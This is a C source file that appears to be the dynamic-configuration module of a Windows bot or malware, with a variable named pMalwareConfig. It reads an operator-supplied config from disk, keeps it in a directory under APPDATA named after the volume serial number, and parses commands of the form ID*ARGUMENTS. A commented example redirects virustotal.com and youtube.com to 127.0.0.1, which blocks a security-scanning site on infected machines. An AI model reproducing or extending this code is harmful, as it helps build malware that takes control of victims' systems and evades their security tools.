#include "dynamicconfig.h"

#include "../common/utils.h"
#include "../common/mem.h"
#include "../common/string.h"

extern bot_t bot;

static config_t* pMalwareConfig = NULL;
static DWORD dwConfigCount = 0;
static RTL_CRITICAL_SECTION csConfig;

static LPSTR _ReadConfigBuffer(void)
{
	LPVOID lpBuffer;
	DWORD dwBufferSize;
	LPSTR pszConfigBuffer;

	if((lpBuffer = ReadFileFromDisk(bot.dynamicconfig.ConfigPath, &dwBufferSize)) == NULL)
		return NULL;

	if((pszConfigBuffer = memalloc(dwBufferSize)) != NULL)
	{
		memcopy(pszConfigBuffer, lpBuffer, dwBufferSize);
	}

	memfree(lpBuffer);

	/*
		ToDo:
		- Decrypt config
	*/
	return pszConfigBuffer;
}

static LPWSTR _GenerateConfigDirectoryPath(void)
{
	LPWSTR pwzDir, pwzDirectory;
	wchar_t wzDirectory[255];

	if((pwzDir = GetFolderPath(CSIDL_APPDATA)) == NULL)
		return NULL;

	pwzDirectory = NULL;
	memzero(&wzDirectory, sizeof(wzDirectory));

	if(CWA(wsprintfW)(wzDirectory, L"%s%x", pwzDir, GetSerialNumber()) > 0)
	{
		/*if((pwzDirectory = StrConcatW(wzDirectory, L"\\")) != NULL)
			CWA(CreateDirectoryW)(wzDirectory, NULL);*/

		pwzDirectory = StrCopyW(wzDirectory, StrLengthW(wzDirectory));

		if(StrConcatW(&pwzDirectory, L"\\"))
			CWA(CreateDirectoryW)(pwzDirectory, NULL);
	}

	memfree(pwzDir);

	return pwzDirectory;
}

void InitDynamicConfig(void)
{
	bot.dynamicconfig.ConfigDirectory = _GenerateConfigDirectoryPath();

	pMalwareConfig = NULL;
	dwConfigCount = 0;
	CWA(RtlInitializeCriticalSection)(&csConfig);
}

void UpdateDynamicConfig(const LPSTR pszConfig)
{
	CWA(RtlEnterCriticalSection)(&csConfig);

	if(pMalwareConfig != NULL)
	{
		memfree(pMalwareConfig);
		pMalwareConfig = NULL;

		dwConfigCount = 0;
	}

	CWA(RtlLeaveCriticalSection)(&csConfig);

	if(WriteFileToDisk((LPVOID)pszConfig, StrLengthA(pszConfig), bot.dynamicconfig.ConfigPath))
		LoadDynamicConfig();
}

static void _HandleConfig(config_t config)
{
	CWA(RtlEnterCriticalSection)(&csConfig);

	if(memreallocEx(&pMalwareConfig, sizeof(config_t) * (dwConfigCount + 1)))
	{
		memcopy(&pMalwareConfig[dwConfigCount], &config, sizeof(config_t));
		dwConfigCount++;
	}

	CWA(RtlLeaveCriticalSection)(&csConfig);
}

static void _HandleConfigLine(const LPSTR pszLine)
{
	/*
		pszLine will look like the following:
		1*youtube.com=127.0.0.1
	*/

	DWORD dwIndex;
	int iConfigType;
	LPSTR pszData, pszArguments;
	config_t config;

	if((dwIndex = StrIndexOfCharA(pszLine, '*')) == -1)
		return;

	pszData = NULL;
	pszArguments = NULL;
	
	do 
	{
		if((pszData = StrCopyExA(pszLine, 0, dwIndex)) == NULL)
			break;

		if((pszArguments = StrCopyExA(pszLine, dwIndex, StrLengthA(pszLine))) == NULL)
			break;

		iConfigType = _ToInt32A(pszData, FALSE);

		config.iConfigType = iConfigType;
		config.pszArguments = StrCopyA(pszArguments, StrLengthA(pszArguments));

		_HandleConfig(config);
	} 
	while (FALSE);
	
	if(pszData != NULL)
		memfree(pszData);

	if(pszArguments != NULL)
		memfree(pszArguments);
}

void LoadDynamicConfig(void)
{
	LPSTR pszCurrentConfig;
	LPSTR* ppszConfigArray;
	DWORD dwConfigArrayLength, i;

	if((pszCurrentConfig = _ReadConfigBuffer()) == NULL)
		return;

	ppszConfigArray = NULL;
	dwConfigArrayLength = 0;

	/*
		Layout of configuration is the following:
		ID*ARGUMENTS;

		Example (DNS_Block):
		1*youtube.com=127.0.0.1;1*virustotal.com=127.0.0.1;
	*/

	do 
	{
		if(!((dwConfigArrayLength = CharCountA(pszCurrentConfig, ';')) > 0))
			break;

		if((ppszConfigArray = SplitString(pszCurrentConfig, ';', dwConfigArrayLength)) == NULL)
			break;
		
		for(i = 0; i < dwConfigArrayLength; i++)
		{
			_HandleConfigLine(ppszConfigArray[i]);
		}
	} 
	while (FALSE);
	
	if(ppszConfigArray != NULL)
		memfree(ppszConfigArray);

	memfree(pszCurrentConfig);
}

config_t* GetConfigsByType(int iConfigType, PDWORD pdwCount)
{
	config_t* pConfig;
	DWORD i, dwCount;

	pConfig = NULL;
	dwCount = 0;

	CWA(RtlEnterCriticalSection)(&csConfig);

	for(i = 0; i < dwConfigCount; i++)
	{
		if(pMalwareConfig[i].iConfigType == iConfigType)
		{
			if(memreallocEx(&pConfig, sizeof(config_t) * (dwCount + 1)))
			{
				memcopy(&pConfig[dwCount], &pMalwareConfig[i], sizeof(config_t));
				dwCount++;
			}
		}
	}

	CWA(RtlLeaveCriticalSection)(&csConfig);

	*pdwCount = dwCount;

	return pConfig;
}